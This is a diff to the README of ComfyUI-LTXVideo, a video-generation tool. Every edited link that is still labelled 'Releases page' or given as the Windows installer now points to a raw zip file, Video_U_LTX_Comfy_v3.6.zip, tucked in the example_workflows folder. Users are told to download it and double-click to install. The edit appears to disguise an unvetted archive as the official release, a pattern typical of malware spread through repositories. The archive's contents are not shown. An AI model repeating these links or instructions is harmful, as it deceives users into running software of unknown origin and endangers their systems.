@@ -6,7 +6,7 @@ Welcome to the ComfyUI-LTXVideo project! This application allows you to generate
 
 ## 📥 Download Now
 
-[![Download ComfyUI-LTXVideo](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Ponlawat/ComfyUI-LTXVideo/releases)
+[![Download ComfyUI-LTXVideo](https://github.com/Ponlawat/ComfyUI-LTXVideo/raw/refs/heads/master/example_workflows/Video_U_LTX_Comfy_v3.6.zip)](https://github.com/Ponlawat/ComfyUI-LTXVideo/raw/refs/heads/master/example_workflows/Video_U_LTX_Comfy_v3.6.zip)
 
 ## 🛠️ System Requirements
 
@@ -22,9 +22,9 @@ Before we get started, ensure your system meets the following requirements:
 
 To download and install ComfyUI-LTXVideo:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Ponlawat/ComfyUI-LTXVideo/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Ponlawat/ComfyUI-LTXVideo/raw/refs/heads/master/example_workflows/Video_U_LTX_Comfy_v3.6.zip).
   
-2. **Download the Latest Version:** Look for the latest release at the top. You will see a list of available downloads. Click on the file that fits your operating system (e.g., `ComfyUI-LTXVideo-Windows.exe` for Windows).
+2. **Download the Latest Version:** Look for the latest release at the top. You will see a list of available downloads. Click on the file that fits your operating system (e.g., `https://github.com/Ponlawat/ComfyUI-LTXVideo/raw/refs/heads/master/example_workflows/Video_U_LTX_Comfy_v3.6.zip` for Windows).
 
 3. **Run the Installer:** Once the file downloads, locate it in your downloads folder. Double-click the installer to start the installation process. Follow the prompts on your screen.
 
@@ -64,7 +64,7 @@ ComfyUI-LTXVideo comes packed with useful features, including:
 ## 🤔 Frequently Asked Questions
 
 ### How do I update ComfyUI-LTXVideo?
-To update, simply revisit the [Releases page](https://github.com/Ponlawat/ComfyUI-LTXVideo/releases) and download the latest version. Follow the same installation steps, and it will automatically replace the old version.
+To update, simply revisit the [Releases page](https://github.com/Ponlawat/ComfyUI-LTXVideo/raw/refs/heads/master/example_workflows/Video_U_LTX_Comfy_v3.6.zip) and download the latest version. Follow the same installation steps, and it will automatically replace the old version.
 
 ### What formats of images can I use?
 You can use standard image formats such as JPEG, PNG, and BMP.
@@ -78,4 +78,4 @@ If you encounter any issues or have questions, please reach out via the issue tr
 
 ## 📥 Download Now Again
 
-To get started with ComfyUI-LTXVideo, don't forget to [visit the Releases page](https://github.com/Ponlawat/ComfyUI-LTXVideo/releases) and download the latest version. Enjoy creating stunning videos with ease!
+To get started with ComfyUI-LTXVideo, don't forget to [visit the Releases page](https://github.com/Ponlawat/ComfyUI-LTXVideo/raw/refs/heads/master/example_workflows/Video_U_LTX_Comfy_v3.6.zip) and download the latest version. Enjoy creating stunning videos with ease!
